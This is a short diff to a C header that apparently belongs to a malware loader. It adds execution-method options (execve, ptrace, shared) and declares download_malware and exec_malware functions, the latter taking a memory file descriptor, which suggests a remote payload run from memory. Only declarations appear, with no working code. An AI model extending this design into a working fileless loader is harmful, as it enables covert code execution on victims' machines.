@@ -38,15 +38,25 @@ typedef enum                    e_protocol
     PROTO_UNKNOWN
 }                               t_protocol;
 
+typedef enum                    e_exec_method
+{
+    EXEC_VE,
+    EXEC_PTRACE,
+    EXEC_SHARED,
+    EXEC_UNKNOWN,
+}                               t_exec_method;
+
 typedef struct                  s_config
 {
-    t_protocol      protocol;
     t_addrinfo      *host_infos;
     char            *remote_file_name;
+    t_protocol      protocol;
+    t_exec_method   exec_method;
 }                               t_config;
 
 int                             parse_opt(int ac, char **av, t_config *config);
 int                             download_malware(t_config config);
+void                            exec_malware(t_config config, int memfd);
 
 
 #endif
